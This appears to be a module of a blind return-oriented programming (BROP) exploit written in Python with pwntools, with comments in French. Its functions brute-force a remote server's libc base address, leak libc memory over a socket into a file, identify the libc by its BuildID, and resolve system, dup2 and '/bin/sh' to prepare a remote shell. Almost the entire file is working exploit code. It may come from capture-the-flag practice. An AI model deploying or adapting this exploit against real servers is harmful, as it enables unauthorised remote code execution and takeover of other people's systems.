#!/usr/bin/python3

from pwn import pwnlib, ELF, p64, u64
from subprocess import PIPE, Popen
from time import sleep
import sys

import print_tools as pt

# SYNTAX COLOURS AND system DATA:




##### libc_base #####--------------------------------------------------------------------------------

def get_libc_base(ExploitStructure):

	begin	= ExploitStructure.beginning()

	libc_offset	= -0x384000	
	return(p64(u64(ExploitStructure.bin_base) + libc_offset))
	
	# v v v v v  PARTIE INUTILE UNE FOIS L'ADRESSE DE LA base DETERMINEE  v v v v v
	libc_base 	= u64(ExploitStructure.bin_base) - 0x1000
	count		= 0

	brop_7	= p64(u64(ExploitStructure.bropgadget) + 0x7)
	brop_9	= p64(u64(ExploitStructure.bropgadget) + 0x9)
	r_15		= b'junkjunk'

	length		= 0x10	# RDX
	socket	= 0x4	# RDI
	
	for i in range(libc_base, 0, -0x1000):

		count += 1
		r = ExploitStructure.remoteConnect()

		#junk		= r.recv()		# "Enter your choice"
			
		ropchain	= brop_7 + p64(i) + r_15 + brop_9 + p64(socket) + leak_adr
		payload 	= begin + ropchain

		print(pt.cpur + '[-] Tested base address : ' + hex(i) + pt.cend, end='\r')

		r.send(payload)
		sleep(ExploitStructure.dodo)

		#--------------------
		resp	= r.recv()

		if b'ELF' in resp:
			print(cver + "[+] Libc based found at : {}".format(hex(i)) + pt.cend)
			print(cver + "[+] Offset from the binary base address is : {}".format(hex(count * -0x1000)) + pt.cend)
			print(pt.cjau + "[!] --> Update getLibcBase() function !" + pt.cend)
			r.close()
			libc_base = i	# dans le cas d'un binaire non remappe (donc avec
			continue		# des adresses ne commençant pas par 0xf7f___...

		try:
			r.close()
		except:
			pass


####################--------------------------------------------------------------------------------

##### LEAK libc #####-------------------------------------------------------------------------------

def leakStuff(ExploitStructure):	# Permet de fuiter n'importe quoi ; en gros, sert a faire des tests

	begin	= ExploitStructure.beginning()
	i		= u64(ExploitStructure.libc_base)

	brop_7	= p64(u64(ExploitStructure.brop_gadget) + 0x7)
	brop_9	= p64(u64(ExploitStructure.brop_gadget) + 0x9)
	r_15		= b'junkjunk'

	length		= 0x10	# RDX
	socket	= 0x4	# RDI
	
	file	= open("LEAKEDLIBC", "wb")
	length		= 0x1

	print(pt.cjau + '[:] Leaking first 0x600 bytes of Libc...' + pt.cend)

	while (i < u64(ExploitStructure.libc_base)+0x601):

		r = ExploitStructure.remoteConnect()

		junk		= r.recv()		# "Enter your choice"
			
		ropchain	= brop_7 + p64(i) + r_15 + brop_9 + p64(socket) + ExploitStructure.leak_adr
		payload 	= begin + ropchain

		r.sendline(payload)
		sleep(ExploitStructure.dodo)

		junk	= r.recvline()

		try:
			resp	= r.recvall()
		except:
			continue

		length = len(resp)
		if len(resp) == 0:
			resp	= b'\x00'
			length 	= 1

		i += length
		print(pt.cpur + '[-] Offset : ' + hex(i) + pt.cend, end='\r')
		file.write(resp)
		file.flush()

		try:
			r.close()
		except:
			pass

	file.close()

#####################-------------------------------------------------------------------------------

##### Symboles #####--------------------------------------------------------------------------------

def getSymboles(ExploitStructure):

	base = u64(ExploitStructure.libc_base)

	if not ExploitStructure.no_lib_leak and not ExploitStructure.build_id:
		cmd = 'readelf -n LEAKEDLIBC | grep BUILD_ID -A1'
		try:
			print(pt.cjau + "[:] Getting BuildID..." + pt.cend)
			p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
			stdout, stderr = p.communicate()
			ExploitStructure.build_id = (stdout.decode("utf-8")).split('tion: ')[1].strip("\x0A")
			print(pt.cver + "[+] BuildID   :	" + ExploitStructure.build_id) 

		except IndexError:
			print(pt.cred + "[!] Can't get BuildID : problem with the leaked libc" + pt.cend)
			exit(pt.cjau + "[:] Exploitation interruption..." + pt.cend)
		except Exception as e:
			print(pt.cred + "[!] Can't get BuildID ; exception information : " + pt.cend + str(e))
			exit(pt.cjau + "[:] Exploitation interruption..." + pt.cend)

	try:
		libc = ELF(pwnlib.libcdb.search_by_build_id(ExploitStructure.build_id))
	except TypeError:
		print(pt.cred + "[!] Error with the given BuildID" + pt.cend)
		exit(pt.cjau + "[:] Exploitation interruption..." + pt.cend)

	system	= p64(base + libc.symbols.system)
	dup2	= p64(base + libc.symbols.dup2)
	binsh	= p64(base + next(libc.search(b'/bin/sh\x00')))

	return system, dup2, binsh


